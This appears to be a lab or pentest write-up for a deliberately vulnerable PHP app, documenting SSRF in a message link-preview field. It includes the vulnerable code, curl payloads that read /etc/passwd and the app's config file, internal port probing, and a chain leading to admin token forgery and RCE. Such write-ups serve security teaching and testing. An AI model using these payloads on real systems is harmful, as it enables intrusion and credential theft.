# 13 — Server-side request forgery in the message link preview

- **OWASP Top 10 (2021):** A10:2021 – SSRF
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/panel/messages.php:44-45` — `POST /panel/messages.php`, field `link`
(`require_login()`, any role):

```php
$link = isset($_POST['link']) ? $_POST['link'] : '';
$preview = null;
if ($link != '') {
    $c = @file_get_contents($link);
    if ($c !== false) $preview = substr($c, 0, 200);
}
```

## How it works (root cause)

The "attached link" field is fetched **server-side** with
`file_get_contents()` and no URL validation. Because
`allow_url_fopen=On` (and `allow_url_include=On`), the wrapper is honoured:
`http://`, `https://`, `file://`, `php://`, `data://`, … all work. The first
200 bytes of the response are stored and later shown to the recipient.

## Exploitation steps

1. Read a local file through the preview:

   ```bash
   curl -s -b /tmp/ulla.jar -d "to=admin&subject=t&body=t&link=file:///etc/passwd" \
        http://localhost:8080/panel/messages.php
   ```

   then read the message back (`/panel/messages.php?read=<id>` as admin, or
   check the `preview` column) — it contains the first 200 bytes of
   `/etc/passwd`.

2. Probe internal services / ports (blind SSRF via timing / the stored
   preview):

   ```bash
   curl -s -b /tmp/ulla.jar -d "to=admin&subject=t&body=t&link=http://127.0.0.1:3307/" \
        http://localhost:8080/panel/messages.php
   ```

   (The MySQL port responds differently from a closed port; the difference
   in the stored `preview` / request time reveals reachability.)

3. Read the app's own config:

   ```bash
   link=file:///var/www/osedekommun/web/includes/config.php
   ```

## Working PoC (verified)

```
link = file:///etc/passwd
```

The stored `preview` (shown on the message-read page and in the DB) equals
the first 200 characters of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
```

## Expected result / verification

- `preview` column in `messages` = first 200 bytes of the target resource.
- Local and internal addresses are reachable from the web server.

## Attack chain

```
SSRF (file://)
  → read config.php → API_TOKEN_KEY → forged admin token (18) → uplist RCE (17)
SSRF (http:// to internal ports)
  → map internal services (MySQL 3307, php-fpm, …)
```

## Notes

- This duplicates the `file://` read capability of 10/11 but from a
  *logged-in* panel endpoint, and stores the result in the message — useful
  for exfiltration to a recipient or to the database.
- `@` suppresses the "failed to open stream" warning; closed internal ports
  simply leave `preview` empty, which is itself a signal.
